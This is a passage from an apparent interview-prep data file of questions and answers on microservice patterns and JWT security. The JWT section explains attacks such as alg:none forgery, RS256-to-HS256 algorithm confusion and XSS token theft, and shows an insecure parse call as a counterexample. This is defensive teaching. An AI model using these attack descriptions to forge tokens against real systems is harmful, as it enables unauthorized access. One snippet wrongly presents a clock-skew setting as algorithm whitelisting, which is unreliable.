<p><strong>Saga</strong> manages distributed business workflows using a sequence of local transactions plus compensating actions for rollback.</p>
<pre>Order Saga: Create Order → Charge Payment → Reserve Inventory → Confirm

If Inventory fails:
  Compensate: Refund Payment → Cancel Order</pre>
<p><strong>Two types:</strong></p>
<pre>// 1. Choreography (event-driven, decentralized)
Order Service → publishes "OrderCreated"
  → Payment Service listens → charges → publishes "PaymentCharged"
    → Inventory Service listens → reserves → publishes "InventoryReserved"
      → Order Service listens → confirms order

If failure: each service publishes compensation events

// 2. Orchestration (central coordinator)
[Saga Orchestrator]
  → Step 1: Call Order Service → "create order"
  → Step 2: Call Payment Service → "charge payment"
  → Step 3: Call Inventory Service → "reserve stock" (FAILS!)
  → Compensate Step 2: "refund payment"
  → Compensate Step 1: "cancel order"</pre>
<table><tr><th>Aspect</th><th>Choreography</th><th>Orchestration</th></tr>
<tr><td>Coupling</td><td>Loose (events)</td><td>Tighter (orchestrator knows flow)</td></tr>
<tr><td>Complexity</td><td>Hard to follow for many steps</td><td>Clear flow in one place</td></tr>
<tr><td>Best for</td><td>Simple sagas (2-3 steps)</td><td>Complex sagas (5+ steps)</td></tr></table>
<div class="key-point">Every saga step MUST have a compensating action defined. Without compensation, partial failures leave the system in an inconsistent state.</div>`,
      },
      {
        q: 'What is a service mesh and when would you use one?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>A service mesh pushes cross-cutting networking concerns — mTLS, retries, timeouts, circuit breaking, traffic shifting, telemetry — out of application code and into sidecar proxies like Envoy next to each service, controlled centrally. The value is consistency and polyglot support: the same resilience and security policies across services regardless of language, without every team reimplementing them. The catch is real operational complexity and latency from the extra hops, so it's overkill for a handful of services. I'd reach for Istio or Linkerd when I have many services in many languages needing uniform mTLS and traffic policy. The gotcha is treating it as a silver bullet — it doesn't fix bad service boundaries.</p></div>
<p>A <strong>service mesh</strong> is an infrastructure layer that handles service-to-service communication, moving networking concerns out of application code into sidecar proxies.</p>
<pre>Without service mesh:
  Each service handles: retries, circuit breakers, mTLS, tracing, load balancing
  → Duplicated logic in every service, every language

With service mesh (e.g., Istio/Linkerd):
  [Service A] ↔ [Sidecar Proxy] ←mesh→ [Sidecar Proxy] ↔ [Service B]
                      ↑                       ↑
                  Handles: mTLS, retries, circuit breaking,
                  traffic splitting, observability</pre>
<p><strong>Features:</strong></p>
<ul>
<li><strong>mTLS</strong>: automatic encryption between services</li>
<li><strong>Traffic management</strong>: canary releases, A/B testing, fault injection</li>
<li><strong>Observability</strong>: distributed tracing, metrics without code changes</li>
<li><strong>Resilience</strong>: retries, timeouts, circuit breakers configured declaratively</li>
</ul>
<p><strong>When to use:</strong></p>
<ul>
<li>20+ microservices where consistent networking policies matter</li>
<li>Strict security requirements (zero-trust, mTLS everywhere)</li>
<li>Polyglot environment (services in different languages)</li>
</ul>
<div class="key-point">Service meshes add operational complexity and latency (extra proxy hop). Don't adopt one until you have enough services that manual networking configuration becomes painful. Istio and Linkerd are the most popular options.</div>`,
      },
      {
        q: 'What resilience patterns are commonly used in microservices?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>The core toolkit is timeouts, retries with exponential backoff and jitter, circuit breakers, bulkheads, and fallbacks — and they work together, not in isolation. Timeouts come first, because without them a slow dependency exhausts your threads and the failure spreads; retries handle transient blips but need backoff and jitter or they become a retry storm that amplifies the outage. Circuit breakers stop you hammering a dead service and fail fast; bulkheads isolate resource pools so one struggling dependency can't sink the whole app; fallbacks degrade gracefully. The key judgment is that only idempotent operations are safe to retry, and every pattern needs tuning — badly configured resilience patterns cause outages as often as they prevent them.</p></div>
<ul>
<li><strong>Timeout</strong>: Don't wait forever. Set max wait time for external calls.</li>
<li><strong>Retry</strong>: Try again on transient failures (with exponential backoff + jitter).</li>
<li><strong>Circuit Breaker</strong>: Stop calling a failing service. Fail fast instead of cascading.</li>
<li><strong>Bulkhead</strong>: Isolate failures. Separate thread pools per dependency.</li>
<li><strong>Fallback</strong>: Provide degraded functionality when a dependency is down.</li>
</ul>
<pre>// Resilience4j example (Java):
@CircuitBreaker(name = "paymentService", fallbackMethod = "paymentFallback")
@Retry(name = "paymentService", maxAttempts = 3)
@TimeLimiter(name = "paymentService", timeoutDuration = 2s)
@Bulkhead(name = "paymentService", maxConcurrentCalls = 10)
public PaymentResult charge(PaymentRequest req) {
    return paymentClient.charge(req);
}

public PaymentResult paymentFallback(PaymentRequest req, Exception ex) {
    return PaymentResult.pending("Payment queued for retry");
}

// Real scenario:
// Recommendation service is slow →
// timeout → open circuit → serve page without recommendations
// User still sees the page, just without recommendations</pre>
<div class="key-point">Layer these patterns: Timeout inside Retry inside Circuit Breaker. Never retry without timeouts and limits — retries without backoff can amplify outages (retry storm).</div>`,
      },
      {
        q: 'What is health checking and readiness vs liveness probes?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Liveness and readiness answer two different questions, and conflating them causes real outages. Liveness asks "is this process wedged and should it be restarted?" — a failing liveness probe kills and reschedules the pod. Readiness asks "can this instance serve traffic right now?" — a failing readiness probe just pulls it out of the load balancer without killing it, which is what you want during startup, warm-up, or a temporary dependency blip. The classic bug is putting downstream dependency checks in the liveness probe: the database blips, every pod fails liveness, Kubernetes restarts them all, and a small problem becomes a full outage. Startup probes handle slow-booting apps. Keep probes cheap and local.</p></div>
<p>Health checks tell the infrastructure whether a service instance is working correctly.</p>
<ul>
<li><strong>Liveness probe</strong>: "Is the process alive?" If it fails, the container is <strong>restarted</strong>.</li>
<li><strong>Readiness probe</strong>: "Can it handle traffic?" If it fails, traffic is <strong>removed</strong> from load balancer (but container keeps running).</li>
<li><strong>Startup probe</strong>: "Has it finished starting?" Prevents liveness checks from killing slow-starting apps.</li>
</ul>
<pre># Kubernetes health checks:
livenessProbe:
  httpGet:
    path: /actuator/health/liveness
    port: 8080
  initialDelaySeconds: 15
  periodSeconds: 10

readinessProbe:
  httpGet:
    path: /actuator/health/readiness
    port: 8080
  periodSeconds: 5

# Spring Boot Actuator:
# /actuator/health/liveness → checks process is alive
# /actuator/health/readiness → checks DB connection, disk space, etc.</pre>
<div class="key-point">A common mistake: putting DB checks in the liveness probe. If the DB is temporarily down, all service instances restart in a loop (crash cascade). Put DB checks in readiness probe instead.</div>`,
      },
      {
        q: 'What is the dual-write problem?',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>The dual-write problem is that a service needs to update its database AND publish an event, but those are two separate systems with no shared transaction — so if one succeeds and the other fails, or the process crashes between them, you get inconsistency: a state change with no event, or an event for a change that rolled back. You can't fix this by reordering or with try/catch; there's always a crash window. The correct fix is to make it a single write — the transactional outbox (write the event into an outbox table in the same DB transaction, relay it later) or change data capture off the DB log. It's the root cause behind most "the event never fired" bugs in event-driven systems.</p></div>
<p>The trap behind most broken event-driven systems: a service must update its database <strong>and</strong> publish an event — and those are two systems that cannot share a transaction.</p>
<pre>// ❌ The broken code that looks fine in review:
@Transactional
public void createOrder(Order order) {
  orderRepository.save(order);          // DB write (transactional)
  kafkaTemplate.send("orders", event);  // Kafka publish (NOT in the transaction!)
}

Failure modes:
  1. DB commits, Kafka send fails/crashes  → order exists, downstream never told
  2. Publish first, then DB fails          → downstream reacts to an order
                                             that doesn't exist
  3. Kafka send inside @Transactional but before commit
     → consumer reads the event, queries your API, gets 404 (not committed yet)</pre>
<p><strong>Correct solutions — make one system the source of truth:</strong></p>
<ul>
<li><strong>Transactional Outbox</strong>: write the event into an <code>outbox</code> table in the SAME DB transaction as the business data; a relay (poller or Debezium CDC) publishes it to Kafka afterwards. At-least-once → consumers must dedupe.</li>
<li><strong>Change Data Capture</strong>: Debezium tails the DB write-ahead log and turns committed rows into events — the DB commit IS the publish decision.</li>
<li><strong>Event sourcing</strong>: the event log is the primary store; DB state is derived — no second write to reconcile.</li>
</ul>
<div class="key-point">The general law: you can never atomically write to two independent systems without 2PC. Any design with "save to DB and also push to queue/cache/search-index" has this bug until proven otherwise — interviewers use it to test if you've operated real event-driven systems.</div>`,
      },
      {
        q: 'What is a distributed monolith? What are the warning signs?',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>A distributed monolith is the worst of both worlds: you've paid the microservices tax — network hops, partial failure, ops overhead — but kept monolith coupling, so services still have to deploy together. The warning signs are concrete: a change in one service forces coordinated releases of others; services share a database; a deep synchronous call chain where one service down breaks everything; shared libraries version-bumped in lockstep; and no ability to deploy a service independently. The root cause is almost always splitting along technical layers, or splitting too early before you understood the domain. The fix is to redraw boundaries around business capabilities and decouple with async events and stable API contracts — or honestly, merge them back.</p></div>
<p>A <strong>distributed monolith</strong> has microservice <em>costs</em> (network, ops, partial failure) with monolith <em>coupling</em> — the worst of both worlds. It's what most failed microservice migrations produce.</p>
<p><strong>Warning signs checklist:</strong></p>
<ul>
<li><strong>Lockstep deploys</strong>: releasing service A requires releasing B and C at the same time (shared release train).</li>
<li><strong>Synchronous call chains</strong>: A → B → C → D to serve one request; availability = product of all (99.9%⁴ ≈ 99.6%), latency = sum.</li>
<li><strong>Shared database</strong>: two services read/write the same tables — schema changes need cross-team coordination; it's one data model wearing two costumes.</li>
<li><strong>Chatty interfaces</strong>: one business operation = dozens of fine-grained calls between two services (the boundary is in the wrong place).</li>
<li><strong>Shared domain libraries</strong>: bumping <code>common-domain-model.jar</code> forces redeploying every service.</li>
<li><strong>Distributed transactions</strong> needed for routine operations.</li>
</ul>
<pre>The test: "Can you deploy this service alone, on a Tuesday,
without asking any other team?"  No → distributed monolith.</pre>
<p><strong>How to fix / avoid:</strong> split by business capability (not by layer or entity), give each service its own data, prefer async events over sync chains, enforce backward-compatible APIs so deploys decouple.</p>
<div class="key-point">Senior take: a well-modularized monolith beats a distributed monolith every time — you pay network and consistency costs only when you get independent deployability and scaling in return. "We split the code but not the data or the deploys" is the standard failure story.</div>`,
      },
      {
        q: 'When do retries make an outage worse? (retry storms, backoff, jitter)',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>The counterintuitive point is that retries amplify load exactly when the system can least handle it: a dependency slows, every caller retries, offered load multiplies, and you turn a partial slowdown into total collapse that cascades layer by layer. The fixes are exponential backoff to spread retries out, jitter so clients don't retry in synchronized waves, and a retry budget or circuit breaker to cap total retry volume. Crucially you only retry idempotent operations, and you don't retry at every layer — retrying at multiple tiers multiplies exponentially. The gotcha most people miss is the synchronized retry wave (thundering herd); jitter is the cheap fix that matters most.</p></div>
<p>Retries are a load <em>amplifier</em>. During a partial outage, naive retries multiply traffic exactly when the system can least afford it — often converting a slowdown into a total collapse.</p>
<pre>The amplification math (3 attempts per layer):
  Client → Gateway → Service A → Service B (struggling)
  3 × 3 × 3 = 27× load on B during ITS worst moment

The death spiral:
  B slows → callers time out → all retry → B's queue grows →
  B slower → more retries → B dies → traffic shifts → C dies…</pre>
<p><strong>Doing retries right:</strong></p>
<pre>// Exponential backoff + FULL JITTER (AWS-recommended):
delay = random(0, min(cap, base × 2^attempt))
// jitter is not optional: without it, all clients that failed together
// retry together — synchronized waves ("retry herd")

Rules:
  1. Retry only idempotent operations (GET, PUT with key) — or use idempotency keys
  2. Retry only retryable errors: 503, 429, timeouts.  NEVER 400/401/404
  3. Cap attempts (2–3), cap total time; honor Retry-After headers
  4. Retry at ONE layer (usually the edge), not every hop
  5. Retry BUDGET (e.g. retries ≤ 10% of requests) — beyond that, fail fast
  6. Combine with circuit breaker: stop hammering a dead dependency
  7. Deadline propagation: don't retry work whose caller already gave up</pre>
<div class="key-point">Interview gold: "retries trade increased load for reduced error rate — a good trade only when failures are transient and load isn't the cause." If the dependency is overloaded, retries are gasoline. That's why retry budgets and circuit breakers exist.</div>`,
      },
      {
        q: 'How do you decide service boundaries when splitting a monolith?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>There's no formula, so I lead with heuristics. I draw boundaries around business capabilities and bounded contexts (DDD), not technical layers — a service should own a cohesive chunk of the domain and its data end to end. The best test is data and change: things that change together belong together, and a good boundary minimizes chatty cross-service calls and shared data. I also weight team ownership via Conway's law — a boundary that needs three teams to coordinate is wrong. The signs I got it wrong are distributed transactions everywhere, constant cross-service joins, and changes that ripple across services. When unsure, err toward coarser services: merging is easy, splitting a wrong boundary is painful.</p></div>
<p>The hardest microservices question because there's no formula — interviewers want your <em>heuristics</em>.</p>
<p><strong>Primary tool: DDD bounded contexts.</strong> Split along business capabilities, where the <em>language changes meaning</em>:</p>
<pre>"Product" means different things per context:
  Catalog   : name, images, description, SEO
  Inventory : SKU, stock count, warehouse location
  Pricing   : price, discounts, tax category
→ three contexts, three services, three models —
  NOT one giant shared Product entity</pre>
<p><strong>Heuristics for a good boundary:</strong></p>
<ul>
<li><strong>Changes together → stays together</strong>: if every feature touches services A and B, the boundary is wrong (check your git history — files that co-change belong together).</li>
<li><strong>Data ownership is decidable</strong>: exactly one service writes each piece of data.</li>
<li><strong>Coarse interface</strong>: one business operation ≈ one call, not a chatty conversation.</li>
<li><strong>Team-sized</strong>: one team owns it end to end (Conway's law is a tool — align service and team boundaries).</li>
<li><strong>Different scaling/availability needs</strong>: image processing vs checkout.</li>
</ul>
<p><strong>Anti-patterns:</strong> entity services (UserService, OrderService, ProductService that are just tables with HTTP on top — every operation spans all of them), layer services (UI-service / logic-service / data-service), nano-services (operational cost &gt; value).</p>
<p><strong>Process: Strangler Fig</strong> — extract the highest-value, least-coupled capability first, route traffic to it, repeat. Start with a modular monolith if boundaries are still unclear; module lines are cheap to move, network lines are not.</p>
<div class="key-point">Best one-liner: "Services should be loosely coupled and highly cohesive — if you must open three services to ship one feature, you drew the lines wrong." Wrong boundaries cost more than no boundaries.</div>`,
      },
      {
        q: 'How do you guarantee event ordering in event-driven microservices?',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>The trick is the premise: there's no global ordering in a distributed system, so the real question is what scope of ordering you actually need — and it's almost always per-entity, not global. The standard technique is to partition by that entity key (Kafka partition by account ID) so all events for one entity land on one partition and are consumed in order, while different entities parallelize freely. If you truly can't guarantee order, make consumers order-tolerant: attach a version or sequence number and drop or reorder stale events. Global total ordering forces everything through one partition and kills throughput, so you avoid needing it. The gotcha is that changing the partition key mid-stream breaks ordering.</p></div>
<p>Trick premise alert: there is <strong>no global ordering</strong> in a distributed system — the real question is <em>what scope of ordering do you actually need?</em> Usually: per entity.</p>
<pre>Kafka's model:
  - Ordering is guaranteed ONLY within a partition
  - Same key → same partition → in order

  producer.send("orders", key = orderId, event);
  // OrderCreated(42), OrderPaid(42), OrderShipped(42)
  // → all on one partition → consumed in order ✅
  // Events for DIFFERENT orders may interleave — and that's fine.</pre>
<p><strong>Where ordering silently breaks (the senior checklist):</strong></p>
<ul>
<li><strong>Producer retries</strong>: send 1 fails, send 2 succeeds, retry of 1 lands after 2 → set <code>enable.idempotence=true</code> (dedupes and preserves order per partition).</li>
<li><strong>Consumer-side parallelism</strong>: consuming a partition then spraying events into a thread pool destroys the ordering Kafka gave you. Parallelize <em>by key</em>, not round-robin.</li>
<li><strong>Repartitioning</strong>: changing partition count remaps keys → old and new events for one entity split across partitions during transition.</li>
<li><strong>Multiple producers</strong> for one entity (or dual-write paths) → no defined order at all.</li>
</ul>
<p><strong>Designing to need less ordering:</strong></p>
<pre>- Version/sequence number in the event: consumer rejects stale
    if (event.version &lt;= current.version) skip;
- Full-state ("fat") events instead of deltas → last-write-wins is safe
- Idempotent handlers → duplicates and some reorderings become harmless</pre>
<div class="key-point">Interview-ready summary: "Partition by aggregate ID for per-entity ordering, idempotent producer against retry reordering, keep per-key ordering through the consumer, and version events so out-of-order delivery is detectable. Global ordering doesn't exist and designs that require it don't scale."</div>`,
      },
      {
        q: 'How do you join data across microservices, each with its own database?',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>Since each service owns its data, the SQL <code>JOIN</code> is gone, and you pick among three options by read pattern. API composition — the caller queries each service and joins in memory — is simplest and fine at low volume, but it's N+1 and slow for large sets. The scalable answer is CQRS with a materialized read model: services publish events and a dedicated query service maintains a denormalized, pre-joined view, accepting eventual consistency. Replicating reference data is a lighter version of that. What you must not do is reach into another service's database directly — that recreates exactly the coupling database-per-service exists to prevent. My default is API composition until it hurts, then a read model.</p></div>
<p>The question that exposes whether database-per-service was understood: "Show orders together with customer names" — but orders and customers live in different services. <code>JOIN</code> is gone. Options:</p>
<p><strong>1. API composition (sync)</strong> — fine for small result sets:</p>
<pre>GET /orders?userId=42        → Order Service
GET /customers/42            → Customer Service
→ merge in the caller (API gateway / BFF)

Problems: N+1 calls for lists, latency = slowest call,
          no cross-service filtering/sorting/pagination
          ("orders of customers in Berlin, sorted by name" = fetch everything 😱)</pre>
<p><strong>2. CQRS materialized view (async)</strong> — the scalable answer:</p>
<pre>Customer Service ──CustomerUpdated──▶ ┌──────────────────┐
                                      │  Order-History    │
Order Service ────OrderCreated──────▶ │  View Service     │
                                      │  (denormalized DB │
                                      │   or Elasticsearch)│
Query: one SELECT on the pre-joined view — fast, filterable, pageable
Cost : eventual consistency + view rebuild logic</pre>
<p><strong>3. Replicate a slice of the data</strong> — Order Service keeps a local copy of just <code>(customerId, name)</code>, updated by subscribing to customer events. Duplication is a feature here, not a sin: reads stay local and the service works even when Customer Service is down.</p>
<p><strong>Anti-patterns:</strong> reaching into another service's database directly (couples you to their schema — the #1 microservice sin), and cross-service distributed queries at request time.</p>
<div class="key-point">Senior framing: "In microservices you move joins from query time to <em>write time</em> — events keep a denormalized view fresh, and queries become single-service reads. You trade consistency lag for autonomy and read performance." If a query needs fresh, transactional joins across two services, that's evidence they should be one service.</div>`,
      },
      {
        q: 'How do you evolve an API without breaking consumers? (contracts and versioning)',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>The rule is backward compatibility, so consumers don't have to upgrade in lockstep with you. Concretely that means additive changes only — add optional fields, never rename, remove, or change the meaning of existing ones — and have consumers ignore unknown fields (the tolerant reader pattern). When a breaking change is truly unavoidable you version it (URL or header), run old and new side by side, and deprecate the old with a real timeline. Consumer-driven contract tests like Pact catch breaks in CI before they hit production. The gotcha people miss is that events are APIs too — the same discipline and schema-registry compatibility rules apply to your event payloads.</p></div>
<p>Independent deployability — the whole point of microservices — dies the moment an API change forces consumers to upgrade simultaneously. Compatibility discipline is what keeps it alive.</p>
<pre>SAFE (backward-compatible):          BREAKING:
  + add optional field to response     - remove/rename a field
  + add optional request param         - change a field's type/format
  + add new endpoint                   - make optional field required
  + add enum value (careful!)          - change error codes/semantics
                                       - tighten validation rules</pre>
<p><strong>1. Tolerant reader (Postel's law)</strong>: consumers ignore unknown fields and don't fail on additions — e.g. don't configure Jackson to <code>FAIL_ON_UNKNOWN_PROPERTIES</code>.</p>
<p><strong>2. Expand–contract (parallel change)</strong> for unavoidable breaking changes:</p>
<pre>Goal: rename "name" → "fullName"
  EXPAND  : write BOTH fields; readers still use "name"
  MIGRATE : consumers switch to "fullName" at their own pace
  CONTRACT: telemetry shows zero readers of "name" → remove it
No simultaneous deploy ever required.</pre>
<p><strong>3. Consumer-driven contract testing (Pact)</strong> — catches breakage in CI, before deploy:</p>
<pre>Consumer declares what it uses:  "GET /users/42 → { id, name }"
  → contract published to a broker
Provider's CI replays every consumer contract against the real service
  → provider removes "name" → PROVIDER's build fails, listing who breaks
"can-i-deploy" gate: verified against all consumer versions in prod</pre>
<p><strong>4. Explicit versioning as last resort</strong> (URL <code>/v2/</code>, header, or media type): you now run and patch two APIs — an operational cost, not a strategy. Prefer additive evolution so v2 is rare.</p>
<div class="key-point">Ranked senior answer: "Additive changes + tolerant readers by default, expand–contract for breaking changes, contract tests to enforce it in CI, explicit versions only when a redesign is unavoidable." Bonus nuance: internal service-to-service APIs can evolve via expand–contract almost indefinitely; long-lived public APIs are where versioning earns its cost.</div>`,
      },
    ],
  },

  // ========================= SECURITY & JWT =========================,
  {
    id: 'security-jwt',
    name: 'Security & JWT',
    icon: '🔒',
    questions: [
      {
        q: 'What is JWT and what are its three parts?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>A JWT is three base64url parts separated by dots: header, payload, and signature. The header names the signing algorithm, the payload carries claims like <code>sub</code>, <code>exp</code>, and roles, and the signature makes it tamper-proof — computed over the first two parts with a secret or private key. The single most important thing to say is that the payload is only encoded, not encrypted — anyone can read it — so you never put secrets in it, and the signature only proves integrity, not confidentiality. The whole security model rests on verifying that signature server-side; skip it and a JWT is just attacker-editable JSON.</p></div>
<p><strong>JWT (JSON Web Token)</strong> is a compact, URL-safe token format for securely transmitting claims between parties.</p>
<pre>// JWT structure: header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEyM30.SflKxwRJSMeKKF2QT4fwpM

// Decoded:
Header:  { "alg": "HS256", "typ": "JWT" }
Payload: { "userId": 123, "role": "admin", "exp": 1699999999 }
Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)</pre>
<ul>
<li><strong>Header</strong>: algorithm (HS256, RS256) and token type</li>
<li><strong>Payload</strong>: claims — registered (exp, iss, sub), public, private</li>
<li><strong>Signature</strong>: ensures token hasn't been tampered with</li>
</ul>
<div class="key-point">JWT is Base64-encoded, NOT encrypted. Anyone can decode and read the payload. Never put passwords or sensitive data in the payload. The signature only guarantees integrity, not confidentiality.</div>`,
      },
      {
        q: 'What is the difference between access tokens and refresh tokens?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>The split exists to balance security against usability. The access token is short-lived (minutes) and sent on every API call, so if it leaks the blast radius is small; the refresh token is long-lived and used only against the auth server to mint new access tokens, so it's exposed far less and can be stored more carefully. That way you're not sending your most powerful credential on every request, and you gain a revocation point — invalidate the refresh token to cut off future access without tracking every access token. Best practice adds refresh-token rotation with reuse detection. The gotcha is treating a long-lived access token as good enough — you lose both the small blast radius and any real revocation story.</p></div>
<ul>
<li><strong>Access token</strong>: short-lived (5-30 min), sent with every API request, used for authorization.</li>
<li><strong>Refresh token</strong>: long-lived (days-weeks), used ONLY to get new access tokens, stored more securely.</li>
</ul>
<pre>// Flow:
1. Login → Server returns: { accessToken (15min), refreshToken (7d) }
2. API calls: Authorization: Bearer &lt;accessToken&gt;
3. Access token expires → 401 Unauthorized
4. POST /refresh { refreshToken } → new accessToken
5. Continue API calls with new accessToken

// Why two tokens?
// Short access token = limited damage window if stolen
// Long refresh token = user doesn't re-login constantly
// Refresh token can be revoked server-side</pre>
<p><strong>Security considerations:</strong></p>
<ul>
<li>Rotate refresh tokens on each use (one-time use)</li>
<li>Store refresh tokens in HttpOnly cookies or server-side</li>
<li>Detect refresh token reuse (indicates theft)</li>
</ul>
<div class="key-point">If an attacker steals an access token, the damage is limited to its lifetime (minutes). If they steal a refresh token, you can revoke it server-side. This is why refresh tokens need stronger protection.</div>`,
      },
      {
        q: 'Where should JWT be stored in the browser?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>My honest answer is to prefer an <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> cookie over localStorage. localStorage is readable by any JavaScript, so a single XSS anywhere on the page steals the token — and XSS is common. An HttpOnly cookie is invisible to JS, which closes the XSS-exfiltration door, at the price of opening CSRF exposure — but CSRF is well understood and cheap to stop with SameSite plus anti-CSRF tokens. So the real tradeoff is XSS risk vs CSRF risk, and CSRF is the easier of the two to defend. The deeper point is that if you have XSS no storage location is truly safe, so token storage is a mitigation, not a substitute for output encoding and a strong CSP.</p></div>
<table style="width:100%;border-collapse:collapse;margin:10px 0;font-size:.88rem;">
<tr><th style="text-align:left;padding:6px;border-bottom:1px solid #ccc;">Storage</th><th style="padding:6px;border-bottom:1px solid #ccc;">XSS Risk</th><th style="padding:6px;border-bottom:1px solid #ccc;">CSRF Risk</th><th style="padding:6px;border-bottom:1px solid #ccc;">Survives Refresh</th></tr>
<tr><td style="padding:6px;">localStorage</td><td style="padding:6px;">❌ High (JS accessible)</td><td style="padding:6px;">✅ None</td><td style="padding:6px;">✅ Yes</td></tr>
<tr><td style="padding:6px;">HttpOnly Cookie</td><td style="padding:6px;">✅ Safe (JS can't read)</td><td style="padding:6px;">❌ Needs SameSite/CSRF token</td><td style="padding:6px;">✅ Yes</td></tr>
<tr><td style="padding:6px;">Memory (variable)</td><td style="padding:6px;">✅ Safest</td><td style="padding:6px;">✅ None</td><td style="padding:6px;">❌ Lost on refresh</td></tr>
</table>
<pre>// Recommended approach:
// Access token: in memory (JavaScript variable)
// Refresh token: HttpOnly + Secure + SameSite=Strict cookie

// Cookie setup (server-side):
Set-Cookie: refreshToken=xyz;
  HttpOnly;       // JS can't access → XSS safe
  Secure;         // HTTPS only
  SameSite=Strict; // prevents CSRF
  Path=/api/refresh; // only sent to refresh endpoint
  Max-Age=604800     // 7 days</pre>
<div class="key-point">The strongest default: short-lived access tokens in memory + refresh tokens in HttpOnly cookies. This protects against both XSS (can't steal from memory/HttpOnly) and CSRF (SameSite).</div>`,
      },
      {
        q: 'How do you validate JWT securely on the backend?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Verifying a JWT is more than "does the signature match." The infamous vulnerability is trusting the token's own <code>alg</code> header — an attacker sets it to <code>none</code>, or swaps RS256 for HS256 and signs with your public key as the HMAC secret. So I pin the expected algorithm server-side instead of reading it from the token. Then verify the signature with the correct key and validate the standard claims: <code>exp</code>, <code>nbf</code>/<code>iat</code>, plus <code>iss</code> and <code>aud</code> so a token minted for another service can't be replayed at yours. With rotating keys I resolve the key by <code>kid</code> against the provider's JWKS. And never trust any claim before the signature checks out.</p></div>
<pre>// JWT validation checklist:
1. Verify SIGNATURE with the correct key/secret
2. Check EXPIRATION (exp claim) — reject expired tokens
3. Check NOT-BEFORE (nbf claim) — reject if before activation
4. Validate ISSUER (iss) — must match your auth server
5. Validate AUDIENCE (aud) — must match your API
6. WHITELIST allowed algorithms — prevent algorithm confusion attack

// Java (Spring Security + jjwt):
Claims claims = Jwts.parserBuilder()
    .setSigningKey(secretKey)           // verify signature
    .requireIssuer("https://auth.myapp.com")  // validate issuer
    .requireAudience("my-api")         // validate audience
    .build()
    .parseClaimsJws(token)             // throws if invalid
    .getBody();

// Check expiration is automatic with jjwt

// CRITICAL: Never do this!
❌ Jwts.parser().setSigningKey(key).parse(token)  // 'parse' accepts unsigned!
✅ Jwts.parser().setSigningKey(key).parseClaimsJws(token)  // 'parseClaimsJws' requires signature</pre>
<p><strong>Algorithm confusion attack:</strong></p>
<pre>// Attacker changes header: { "alg": "none" }
// If server accepts "none" algorithm → anyone can forge tokens!
// Always whitelist: .setAllowedClockSkewSeconds(30)
//                    .require("alg", "RS256")</pre>
<div class="key-point">Never trust a decoded token unless the signature and ALL claims are verified. The most dangerous mistake: accepting <code>alg: none</code> or using the wrong key type.</div>`,
      },
      {
        q: 'What are common JWT security vulnerabilities?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>The classics all come from trusting the token too much. Number one is the algorithm-confusion and <code>alg: none</code> attack — never let the token dictate its own verification algorithm, pin it server-side. Second, weak or hardcoded HMAC secrets that are brute-forceable — use strong keys or asymmetric signing. Third, no revocation: you can't easily kill a JWT before it expires, so long-lived tokens are dangerous — keep them short and add a denylist or refresh-token rotation. Fourth, storing them where XSS can grab them, and putting sensitive data in the always-readable payload. And missing <code>aud</code>/<code>iss</code> checks let a token be replayed across services. The theme is: validate everything server-side, keep lifetimes short, and never confuse encoding with encryption.</p></div>
<ol>
<li><strong>Algorithm confusion</strong>: Attacker changes RS256→HS256, uses public key as HMAC secret. Fix: whitelist algorithms.</li>
<li><strong>Weak signing secret</strong>: Short secrets can be brute-forced. Fix: use 256+ bit random secrets or asymmetric keys.</li>
<li><strong>Long token lifetime</strong>: Stolen tokens valid for hours/days. Fix: short-lived access tokens (5-15 min).</li>
<li><strong>Sensitive data in payload</strong>: JWT is encoded, not encrypted. Fix: never put passwords, SSNs, or PII in tokens.</li>
<li><strong>Missing revocation</strong>: JWT is stateless — no way to invalidate. Fix: short lifetime + server-side refresh token revocation.</li>
<li><strong>Token stored in localStorage</strong>: Accessible via XSS. Fix: use HttpOnly cookies or memory.</li>
<li><strong>No audience/issuer check</strong>: Token from Service A accepted by Service B. Fix: validate iss and aud claims.</li>
</ol>
<pre>// Vulnerability: algorithm confusion attack
// Attacker takes RS256 token, changes header to HS256
// Signs with the PUBLIC KEY (which is... public!)
// Server using "flexible" algorithm verification → accepts it!
// Fix: ALWAYS enforce expected algorithm on the server</pre>
<div class="key-point">Most JWT problems come from implementation mistakes, not from the token format itself. Use well-maintained libraries (jose, jjwt, jsonwebtoken) and follow their security guides.</div>`,
      },
      {
        q: 'How do you handle logout or revocation with JWT?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>This is JWT's Achilles heel: because validation is stateless and offline, there's no built-in way to revoke a token before it expires — logout on the client just deletes the token, but a stolen copy still works until <code>exp</code>. So you pick a strategy. The pragmatic one is short-lived access tokens plus a revocable refresh token: logout invalidates the refresh token and access dies quickly on its own. For immediate revocation you keep a server-side denylist keyed by <code>jti</code>, checked on each request — but that reintroduces the stateful lookup JWT was meant to avoid. The honest take: if you need instant, reliable revocation, JWTs are fighting you and a server-side session may be the better tool.</p></div>
<p>JWT is stateless by design — there's no built-in way to invalidate a token before it expires. Here are strategies:</p>
<pre>// Strategy 1: Short-lived access tokens (simplest)
Access token: 5-15 minutes
→ After logout, token expires quickly on its own
→ Con: still valid for a few minutes after logout

// Strategy 2: Token blacklist (for immediate logout)
On logout:
  → Add token ID (jti claim) to Redis blacklist
  → Set TTL = token's remaining lifetime
  → On every request: check if jti is blacklisted

BLACKLIST in Redis:
  SET "revoked:abc123" "" EX 900  // expires in 15 min

// Strategy 3: Server-side refresh token store (recommended)
On logout:
  → Delete refresh token from database
  → Access token expires naturally (short-lived)
  → User can't get new access tokens

// Strategy 4: Token versioning
User table: { id, tokenVersion: 5 }
JWT payload: { userId: 123, tokenVersion: 5 }
